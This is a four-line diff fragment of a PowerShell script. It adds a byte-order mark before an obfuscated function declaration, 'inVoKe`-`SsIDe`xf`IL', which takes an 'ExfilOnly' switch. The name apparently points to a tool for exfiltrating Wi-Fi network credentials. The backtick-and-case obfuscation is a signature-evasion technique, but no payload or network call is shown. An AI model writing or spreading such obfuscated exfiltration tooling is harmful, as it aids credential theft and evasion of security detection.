@@ -1,4 +1,4 @@
-function inVoKe`-`SsIDe`xf`IL {
+﻿function inVoKe`-`SsIDe`xf`IL {
     [CmdletBinding()]
     param(
         [switch]$ExfilOnly,
